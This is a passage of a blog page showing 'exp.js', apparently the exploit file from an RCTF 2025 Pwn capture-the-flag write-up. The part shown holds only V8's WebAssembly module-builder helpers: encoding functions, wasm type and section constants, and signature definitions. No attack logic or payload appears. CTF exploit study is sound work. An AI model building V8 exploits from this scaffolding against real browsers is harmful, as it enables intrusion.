<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
            if (label) {
                label.textContent = isDark ? "深色" : "浅色";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>花盆 | /writeups/RCTF-2025-Pwn-Writeup/exp.js</title><meta name="author" content="LittFlower"/><meta property="og:title" content="花盆 | /writeups/RCTF-2025-Pwn-Writeup/exp.js"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/RCTF-2025-Pwn-Writeup/exp.js"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="preload" as="style" href="/style.css" type="text/css"/><link rel="preload" as="style" href="/fonts.css" type="text/css"/><link rel="stylesheet" href="/style.css" type="text/css"/><link rel="stylesheet" href="/fonts.css" type="text/css"/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt loading="lazy" decoding="async"/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt loading="lazy" decoding="async"/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-js"><span class="hljs-comment">// Copyright 2016 the V8 project authors. All rights reserved.</span>
<span class="hljs-comment">// Use of this source code is governed by a BSD-style license that can be</span>
<span class="hljs-comment">// found in the LICENSE file.</span>

<span class="hljs-comment">// Used for encoding f32 and double constants to bits.</span>
<span class="hljs-keyword">let</span> byte_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-number">8</span>);
<span class="hljs-keyword">let</span> data_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(byte_view.<span class="hljs-property">buffer</span>);

<span class="hljs-comment">// The bytes function receives one of</span>
<span class="hljs-comment">//  - several arguments, each of which is either a number or a string of length</span>
<span class="hljs-comment">//    1; if it&#x27;s a string, the charcode of the contained character is used.</span>
<span class="hljs-comment">//  - a single array argument containing the actual arguments</span>
<span class="hljs-comment">//  - a single string; the returned buffer will contain the char codes of all</span>
<span class="hljs-comment">//    contained characters.</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">bytes</span>(<span class="hljs-params">...input</span>) {
  <span class="hljs-keyword">if</span> (input.<span class="hljs-property">length</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-keyword">typeof</span> input[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;array&#x27;</span>) input = input[<span class="hljs-number">0</span>];
  <span class="hljs-keyword">if</span> (input.<span class="hljs-property">length</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-keyword">typeof</span> input[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;string&#x27;</span>) {
    <span class="hljs-keyword">let</span> len = input[<span class="hljs-number">0</span>].<span class="hljs-property">length</span>;
    <span class="hljs-keyword">let</span> view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(len);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) view[i] = input[<span class="hljs-number">0</span>].<span class="hljs-title function_">charCodeAt</span>(i);
    <span class="hljs-keyword">return</span> view.<span class="hljs-property">buffer</span>;
  }
  <span class="hljs-keyword">let</span> view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(input.<span class="hljs-property">length</span>);
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; input.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-keyword">let</span> val = input[i];
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> val == <span class="hljs-string">&#x27;string&#x27;</span>) {
      <span class="hljs-keyword">if</span> (val.<span class="hljs-property">length</span> != <span class="hljs-number">1</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;string inputs must have length 1&#x27;</span>);
      }
      val = val.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>);
    }
    view[i] = val | <span class="hljs-number">0</span>;
  }
  <span class="hljs-keyword">return</span> view.<span class="hljs-property">buffer</span>;
}

<span class="hljs-comment">// Header declaration constants</span>
<span class="hljs-keyword">var</span> kWasmH0 = <span class="hljs-number">0</span>;
<span class="hljs-keyword">var</span> kWasmH1 = <span class="hljs-number">0x61</span>;
<span class="hljs-keyword">var</span> kWasmH2 = <span class="hljs-number">0x73</span>;
<span class="hljs-keyword">var</span> kWasmH3 = <span class="hljs-number">0x6d</span>;

<span class="hljs-keyword">var</span> kWasmV0 = <span class="hljs-number">0x1</span>;
<span class="hljs-keyword">var</span> kWasmV1 = <span class="hljs-number">0</span>;
<span class="hljs-keyword">var</span> kWasmV2 = <span class="hljs-number">0</span>;
<span class="hljs-keyword">var</span> kWasmV3 = <span class="hljs-number">0</span>;

<span class="hljs-keyword">var</span> kHeaderSize = <span class="hljs-number">8</span>;
<span class="hljs-keyword">var</span> kPageSize = <span class="hljs-number">65536</span>;
<span class="hljs-keyword">var</span> kSpecMaxPages = <span class="hljs-number">65536</span>;
<span class="hljs-keyword">var</span> kMaxVarInt32Size = <span class="hljs-number">5</span>;
<span class="hljs-keyword">var</span> kMaxVarInt64Size = <span class="hljs-number">10</span>;
<span class="hljs-keyword">var</span> kSpecMaxFunctionParams = <span class="hljs-number">1_000</span>;

<span class="hljs-keyword">let</span> kDeclNoLocals = <span class="hljs-number">0</span>;

<span class="hljs-comment">// Section declaration constants</span>
<span class="hljs-keyword">let</span> kUnknownSectionCode = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> kTypeSectionCode = <span class="hljs-number">1</span>;        <span class="hljs-comment">// Function signature declarations</span>
<span class="hljs-keyword">let</span> kImportSectionCode = <span class="hljs-number">2</span>;      <span class="hljs-comment">// Import declarations</span>
<span class="hljs-keyword">let</span> kFunctionSectionCode = <span class="hljs-number">3</span>;    <span class="hljs-comment">// Function declarations</span>
<span class="hljs-keyword">let</span> kTableSectionCode = <span class="hljs-number">4</span>;       <span class="hljs-comment">// Indirect function table and other tables</span>
<span class="hljs-keyword">let</span> kMemorySectionCode = <span class="hljs-number">5</span>;      <span class="hljs-comment">// Memory attributes</span>
<span class="hljs-keyword">let</span> kGlobalSectionCode = <span class="hljs-number">6</span>;      <span class="hljs-comment">// Global declarations</span>
<span class="hljs-keyword">let</span> kExportSectionCode = <span class="hljs-number">7</span>;      <span class="hljs-comment">// Exports</span>
<span class="hljs-keyword">let</span> kStartSectionCode = <span class="hljs-number">8</span>;       <span class="hljs-comment">// Start function declaration</span>
<span class="hljs-keyword">let</span> kElementSectionCode = <span class="hljs-number">9</span>;     <span class="hljs-comment">// Elements section</span>
<span class="hljs-keyword">let</span> kCodeSectionCode = <span class="hljs-number">10</span>;       <span class="hljs-comment">// Function code</span>
<span class="hljs-keyword">let</span> kDataSectionCode = <span class="hljs-number">11</span>;       <span class="hljs-comment">// Data segments</span>
<span class="hljs-keyword">let</span> kDataCountSectionCode = <span class="hljs-number">12</span>;  <span class="hljs-comment">// Data segment count (between Element &amp; Code)</span>
<span class="hljs-keyword">let</span> kTagSectionCode = <span class="hljs-number">13</span>;        <span class="hljs-comment">// Tag section (between Memory &amp; Global)</span>
<span class="hljs-keyword">let</span> kStringRefSectionCode = <span class="hljs-number">14</span>;  <span class="hljs-comment">// Stringref literals section (between Tag &amp; Global)</span>
<span class="hljs-keyword">let</span> kLastKnownSectionCode = <span class="hljs-number">14</span>;

<span class="hljs-comment">// Name section types</span>
<span class="hljs-keyword">let</span> kModuleNameCode = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> kFunctionNamesCode = <span class="hljs-number">1</span>;
<span class="hljs-keyword">let</span> kLocalNamesCode = <span class="hljs-number">2</span>;

<span class="hljs-keyword">let</span> kWasmSharedTypeForm = <span class="hljs-number">0x65</span>;
<span class="hljs-keyword">let</span> kWasmFunctionTypeForm = <span class="hljs-number">0x60</span>;
<span class="hljs-keyword">let</span> kWasmStructTypeForm = <span class="hljs-number">0x5f</span>;
<span class="hljs-keyword">let</span> kWasmArrayTypeForm = <span class="hljs-number">0x5e</span>;
<span class="hljs-keyword">let</span> kWasmContTypeForm = <span class="hljs-number">0x5d</span>;
<span class="hljs-keyword">let</span> kWasmSubtypeForm = <span class="hljs-number">0x50</span>;
<span class="hljs-keyword">let</span> kWasmSubtypeFinalForm = <span class="hljs-number">0x4f</span>;
<span class="hljs-keyword">let</span> kWasmRecursiveTypeGroupForm = <span class="hljs-number">0x4e</span>;
<span class="hljs-keyword">let</span> kWasmDescriptorTypeForm = <span class="hljs-number">0x4d</span>;
<span class="hljs-keyword">let</span> kWasmDescribesTypeForm = <span class="hljs-number">0x4c</span>;

<span class="hljs-keyword">let</span> kNoSuperType = <span class="hljs-number">0xFFFFFFFF</span>;

<span class="hljs-keyword">let</span> kLimitsNoMaximum = <span class="hljs-number">0x00</span>;
<span class="hljs-keyword">let</span> kLimitsWithMaximum = <span class="hljs-number">0x01</span>;
<span class="hljs-keyword">let</span> kLimitsSharedNoMaximum = <span class="hljs-number">0x02</span>;
<span class="hljs-keyword">let</span> kLimitsSharedWithMaximum = <span class="hljs-number">0x03</span>;
<span class="hljs-keyword">let</span> kLimitsMemory64NoMaximum = <span class="hljs-number">0x04</span>;
<span class="hljs-keyword">let</span> kLimitsMemory64WithMaximum = <span class="hljs-number">0x05</span>;
<span class="hljs-keyword">let</span> kLimitsMemory64SharedNoMaximum = <span class="hljs-number">0x06</span>;
<span class="hljs-keyword">let</span> kLimitsMemory64SharedWithMaximum = <span class="hljs-number">0x07</span>;

<span class="hljs-comment">// Segment flags</span>
<span class="hljs-keyword">let</span> kActiveNoIndex = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> kPassive = <span class="hljs-number">1</span>;
<span class="hljs-keyword">let</span> kActiveWithIndex = <span class="hljs-number">2</span>;
<span class="hljs-keyword">let</span> kDeclarative = <span class="hljs-number">3</span>;
<span class="hljs-keyword">let</span> kPassiveWithElements = <span class="hljs-number">5</span>;
<span class="hljs-keyword">let</span> kDeclarativeWithElements = <span class="hljs-number">7</span>;

<span class="hljs-comment">// Function declaration flags</span>
<span class="hljs-keyword">let</span> kDeclFunctionName = <span class="hljs-number">0x01</span>;
<span class="hljs-keyword">let</span> kDeclFunctionImport = <span class="hljs-number">0x02</span>;
<span class="hljs-keyword">let</span> kDeclFunctionLocals = <span class="hljs-number">0x04</span>;
<span class="hljs-keyword">let</span> kDeclFunctionExport = <span class="hljs-number">0x08</span>;

<span class="hljs-comment">// Value types and related</span>
<span class="hljs-keyword">let</span> kWasmVoid = <span class="hljs-number">0x40</span>;
<span class="hljs-keyword">let</span> kWasmI32 = <span class="hljs-number">0x7f</span>;
<span class="hljs-keyword">let</span> kWasmI64 = <span class="hljs-number">0x7e</span>;
<span class="hljs-keyword">let</span> kWasmF32 = <span class="hljs-number">0x7d</span>;
<span class="hljs-keyword">let</span> kWasmF64 = <span class="hljs-number">0x7c</span>;
<span class="hljs-keyword">let</span> kWasmS128 = <span class="hljs-number">0x7b</span>;
<span class="hljs-keyword">let</span> kWasmI8 = <span class="hljs-number">0x78</span>;
<span class="hljs-keyword">let</span> kWasmI16 = <span class="hljs-number">0x77</span>;
<span class="hljs-keyword">let</span> kWasmF16 = <span class="hljs-number">0x76</span>;

<span class="hljs-comment">// These are defined as negative integers to distinguish them from positive type</span>
<span class="hljs-comment">// indices.</span>
<span class="hljs-keyword">let</span> kWasmNullFuncRef = -<span class="hljs-number">0x0d</span>;
<span class="hljs-keyword">let</span> kWasmNullExternRef = -<span class="hljs-number">0x0e</span>;
<span class="hljs-keyword">let</span> kWasmNullRef = -<span class="hljs-number">0x0f</span>;
<span class="hljs-keyword">let</span> kWasmFuncRef = -<span class="hljs-number">0x10</span>;
<span class="hljs-keyword">let</span> kWasmAnyFunc = kWasmFuncRef;  <span class="hljs-comment">// Alias named as in the JS API spec</span>
<span class="hljs-keyword">let</span> kWasmExternRef = -<span class="hljs-number">0x11</span>;
<span class="hljs-keyword">let</span> kWasmAnyRef = -<span class="hljs-number">0x12</span>;
<span class="hljs-keyword">let</span> kWasmEqRef = -<span class="hljs-number">0x13</span>;
<span class="hljs-keyword">let</span> kWasmI31Ref = -<span class="hljs-number">0x14</span>;
<span class="hljs-keyword">let</span> kWasmStructRef = -<span class="hljs-number">0x15</span>;
<span class="hljs-keyword">let</span> kWasmArrayRef = -<span class="hljs-number">0x16</span>;
<span class="hljs-keyword">let</span> kWasmExnRef = -<span class="hljs-number">0x17</span>;
<span class="hljs-keyword">let</span> kWasmNullExnRef = -<span class="hljs-number">0x0c</span>;
<span class="hljs-keyword">let</span> kWasmStringRef = -<span class="hljs-number">0x19</span>;
<span class="hljs-keyword">let</span> kWasmStringViewWtf8 = -<span class="hljs-number">0x1a</span>;
<span class="hljs-keyword">let</span> kWasmStringViewWtf16 = -<span class="hljs-number">0x20</span>;
<span class="hljs-keyword">let</span> kWasmStringViewIter = -<span class="hljs-number">0x1f</span>;
<span class="hljs-keyword">const</span> kWasmContRef = -<span class="hljs-number">0x18</span>;
<span class="hljs-keyword">const</span> kWasmNullContRef = -<span class="hljs-number">0x0b</span>;

<span class="hljs-comment">// Use the positive-byte versions inside function bodies.</span>
<span class="hljs-keyword">let</span> kLeb128Mask = <span class="hljs-number">0x7f</span>;
<span class="hljs-keyword">let</span> kFuncRefCode = kWasmFuncRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kAnyFuncCode = kFuncRefCode;  <span class="hljs-comment">// Alias named as in the JS API spec</span>
<span class="hljs-keyword">let</span> kExternRefCode = kWasmExternRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kAnyRefCode = kWasmAnyRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kEqRefCode = kWasmEqRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kI31RefCode = kWasmI31Ref &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kNullExternRefCode = kWasmNullExternRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kNullFuncRefCode = kWasmNullFuncRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kStructRefCode = kWasmStructRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kArrayRefCode = kWasmArrayRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kExnRefCode = kWasmExnRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kNullExnRefCode = kWasmNullExnRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kNullRefCode = kWasmNullRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kStringRefCode = kWasmStringRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kStringViewWtf8Code = kWasmStringViewWtf8 &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kStringViewWtf16Code = kWasmStringViewWtf16 &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kStringViewIterCode = kWasmStringViewIter &amp; kLeb128Mask;
<span class="hljs-keyword">const</span> kContRefCode = kWasmContRef &amp; kLeb128Mask;
<span class="hljs-keyword">const</span> kNullContRefCode = kWasmNullContRef &amp; kLeb128Mask;

<span class="hljs-keyword">let</span> kWasmRefNull = <span class="hljs-number">0x63</span>;
<span class="hljs-keyword">let</span> kWasmRef = <span class="hljs-number">0x64</span>;
<span class="hljs-keyword">let</span> kWasmExact = <span class="hljs-number">0x62</span>;

<span class="hljs-comment">// Implementation detail of `wasmRef[Null]Type`, don&#x27;t use directly.</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RefTypeBuilder</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">opcode, heap_type</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">opcode</span> = opcode;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">heap_type</span> = heap_type;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_shared</span> = <span class="hljs-literal">false</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_exact</span> = <span class="hljs-literal">false</span>;
  }
  <span class="hljs-title function_">nullable</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">opcode</span> = kWasmRefNull;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
  <span class="hljs-title function_">shared</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_shared</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
  <span class="hljs-title function_">exact</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_exact</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">wasmRefNullType</span>(<span class="hljs-params">heap_type</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RefTypeBuilder</span>(kWasmRefNull, heap_type);
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">wasmRefType</span>(<span class="hljs-params">heap_type</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RefTypeBuilder</span>(kWasmRef, heap_type);
}

<span class="hljs-keyword">let</span> kExternalFunction = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> kExternalTable = <span class="hljs-number">1</span>;
<span class="hljs-keyword">let</span> kExternalMemory = <span class="hljs-number">2</span>;
<span class="hljs-keyword">let</span> kExternalGlobal = <span class="hljs-number">3</span>;
<span class="hljs-keyword">let</span> kExternalTag = <span class="hljs-number">4</span>;
<span class="hljs-keyword">let</span> kExternalExactFunction = <span class="hljs-number">32</span>;

<span class="hljs-keyword">let</span> kTableZero = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> kMemoryZero = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> kSegmentZero = <span class="hljs-number">0</span>;

<span class="hljs-keyword">let</span> kExceptionAttribute = <span class="hljs-number">0</span>;

<span class="hljs-keyword">const</span> kAtomicSeqCst = <span class="hljs-number">0</span>;
<span class="hljs-keyword">const</span> kAtomicAcqRel = <span class="hljs-number">1</span>;

<span class="hljs-comment">// Useful signatures</span>
<span class="hljs-keyword">let</span> kSig_i_i = <span class="hljs-title function_">makeSig</span>([kWasmI32], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_l_l = <span class="hljs-title function_">makeSig</span>([kWasmI64], [kWasmI64]);
<span class="hljs-keyword">let</span> kSig_i_l = <span class="hljs-title function_">makeSig</span>([kWasmI64], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_i_ii = <span class="hljs-title function_">makeSig</span>([kWasmI32, kWasmI32], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_i_iii = <span class="hljs-title function_">makeSig</span>([kWasmI32, kWasmI32, kWasmI32], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_i_iiii = <span class="hljs-title function_">makeSig</span>([kWasmI32, kWasmI32, kWasmI32, kWasmI32], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_v_iiii = <span class="hljs-title function_">makeSig</span>([kWasmI32, kWasmI32, kWasmI32, kWasmI32], []);
<span class="hljs-keyword">let</span> kSig_l_iiii = <span class="hljs-title function_">makeSig</span>([kWasmI32, kWasmI32, kWasmI32, kWasmI32], [kWasmI64]);
<span class="hljs-keyword">let</span> kSig_l_i = <span class="hljs-title function_">makeSig</span>([kWasmI32], [kWasmI64]);
<span class="hljs-keyword">let</span> kSig_f_i = <span class="hljs-title function_">makeSig</span>([kWasmI32], [kWasmF32]);
<span class="hljs-keyword">let</span> kSig_i_f = <span class="hljs-title function_">makeSig</span>([kWasmF32], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_i_ff = <span class="hljs-title function_">makeSig</span>([kWasmF32, kWasmF32], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_f_ff = <span class="hljs-title function_">makeSig</span>([kWasmF32, kWasmF32], [kWasmF32]);
<span class="hljs-keyword">let</span> kSig_f_ffff = <span class="hljs-title function_">makeSig</span>([kWasmF32, kWasmF32, kWasmF32, kWasmF32], [kWasmF32]);
<span class="hljs-keyword">let</span> kSig_d_dd = <span class="hljs-title function_">makeSig</span>([kWasmF64, kWasmF64], [kWasmF64]);
<span class="hljs-keyword">let</span> kSig_d_dddd = <span class="hljs-title function_">makeSig</span>([kWasmF64, kWasmF64, kWasmF64, kWasmF64], [kWasmF64]);
<span class="hljs-keyword">let</span> kSig_l_ll = <span class="hljs-title function_">makeSig</span>([kWasmI64, kWasmI64], [kWasmI64]);
<span class="hljs-keyword">let</span> kSig_l_llll = <span class="hljs-title function_">makeSig</span>([kWasmI64, kWasmI64, kWasmI64, kWasmI64], [kWasmI64]);
<span class="hljs-keyword">let</span> kSig_i_dd = <span class="hljs-title function_">makeSig</span>([kWasmF64, kWasmF64], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_v_v = <span class="hljs-title function_">makeSig</span>([], []);
<span class="hljs-keyword">let</span> kSig_i_v = <span class="hljs-title function_">makeSig</span>([], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_l_v = <span class="hljs-title function_">makeSig</span>([], [kWasmI64]);
<span class="hljs-keyword">let</span> kSig_f_v = <span class="hljs-title function_">makeSig</span>([], [kWasmF32]);
<span class="hljs-keyword">let</span> kSig_d_v = <span class="hljs-title function_">makeSig</span>([], [kWasmF64]);
<span class="hljs-keyword">let</span> kSig_v_i = <span class="hljs-title function_">makeSig</span>([kWasmI32], []);
<span class="hljs-keyword">let</span> kSig_v_ii = <span class="hljs-title function_">makeSig</span>([kWasmI32, kWasmI32], []);
<span class="hljs-keyword">let</span> kSig_v_iii = <span class="hljs-title function_">makeSig</span>([kWasmI32, kWasmI32, kWasmI32], []);
<span class="hljs-keyword">let</span> kSig_v_l = <span class="hljs-title function_">makeSig</span>([kWasmI64], []);
<span class="hljs-keyword">let</span> kSig_v_li = <span class="hljs-title function_">makeSig</span>([kWasmI64, kWasmI32], []);
<span class="hljs-keyword">let</span> kSig_v_lii = <span class="hljs-title function_">makeSig</span>([kWasmI64, kWasmI32, kWasmI32], []);
<span class="hljs-keyword">let</span> kSig_v_d = <span class="hljs-title function_">makeSig</span>([kWasmF64], []);
<span class="hljs-keyword">let</span> kSig_v_dd = <span class="hljs-title function_">makeSig</span>([kWasmF64, kWasmF64], []);
<span class="hljs-keyword">let</span> kSig_v_ddi = <span class="hljs-title function_">makeSig</span>([kWasmF64, kWasmF64, kWasmI32], []);
<span class="hljs-keyword">let</span> kSig_ii_v = <span class="hljs-title function_">makeSig</span>([], [kWasmI32, kWasmI32]);
<span class="hljs-keyword">let</span> kSig_iii_v = <span class="hljs-title function_">makeSig</span>([], [kWasmI32, kWasmI32, kWasmI32]);
<span class="hljs-keyword">let</span> kSig_ii_i = <span class="hljs-title function_">makeSig</span>([kWasmI32], [kWasmI32, kWasmI32]);
<span class="hljs-keyword">let</span> kSig_iii_i = <span class="hljs-title function_">makeSig</span>([kWasmI32], [kWasmI32, kWasmI32, kWasmI32]);
<span class="hljs-keyword">let</span> kSig_ii_ii = <span class="hljs-title function_">makeSig</span>([kWasmI32, kWasmI32], [kWasmI32, kWasmI32]);
<span class="hljs-keyword">let</span> kSig_iii_ii = <span class="hljs-title function_">makeSig</span>([kWasmI32, kWasmI32], [kWasmI32, kWasmI32, kWasmI32]);

<span class="hljs-keyword">let</span> kSig_v_f = <span class="hljs-title function_">makeSig</span>([kWasmF32], []);
<span class="hljs-keyword">let</span> kSig_f_f = <span class="hljs-title function_">makeSig</span>([kWasmF32], [kWasmF32]);
<span class="hljs-keyword">let</span> kSig_f_d = <span class="hljs-title function_">makeSig</span>([kWasmF64], [kWasmF32]);
<span class="hljs-keyword">let</span> kSig_d_d = <span class="hljs-title function_">makeSig</span>([kWasmF64], [kWasmF64]);
<span class="hljs-keyword">let</span> kSig_d_f = <span class="hljs-title function_">makeSig</span>([kWasmF32], [kWasmF64]);
<span class="hljs-keyword">let</span> kSig_d_i = <span class="hljs-title function_">makeSig</span>([kWasmI32], [kWasmF64]);
<span class="hljs-keyword">let</span> kSig_r_r = <span class="hljs-title function_">makeSig</span>([kWasmExternRef], [kWasmExternRef]);
<span class="hljs-keyword">let</span> kSig_a_a = <span class="hljs-title function_">makeSig</span>([kWasmAnyFunc], [kWasmAnyFunc]);
<span class="hljs-keyword">let</span> kSig_i_r = <span class="hljs-title function_">makeSig</span>([kWasmExternRef], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_v_r = <span class="hljs-title function_">makeSig</span>([kWasmExternRef], []);
<span class="hljs-keyword">let</span> kSig_v_a = <span class="hljs-title function_">makeSig</span>([kWasmAnyFunc], []);
<span class="hljs-keyword">let</span> kSig_v_rr = <span class="hljs-title function_">makeSig</span>([kWasmExternRef, kWasmExternRef], []);
<span class="hljs-keyword">let</span> kSig_v_aa = <span class="hljs-title function_">makeSig</span>([kWasmAnyFunc, kWasmAnyFunc], []);
<span class="hljs-keyword">let</span> kSig_r_v = <span class="hljs-title function_">makeSig</span>([], [kWasmExternRef]);
<span class="hljs-keyword">let</span> kSig_a_v = <span class="hljs-title function_">makeSig</span>([], [kWasmAnyFunc]);
<span class="hljs-keyword">let</span> kSig_a_i = <span class="hljs-title function_">makeSig</span>([kWasmI32], [kWasmAnyFunc]);
<span class="hljs-keyword">let</span> kSig_s_i = <span class="hljs-title function_">makeSig</span>([kWasmI32], [kWasmS128]);
<span class="hljs-keyword">let</span> kSig_i_s = <span class="hljs-title function_">makeSig</span>([kWasmS128], [kWasmI32]);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeSig</span>(<span class="hljs-params">params, results</span>) {
  <span class="hljs-keyword">return</span> {<span class="hljs-attr">params</span>: params, <span class="hljs-attr">results</span>: results};
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeSig_v_x</span>(<span class="hljs-params">x</span>) {
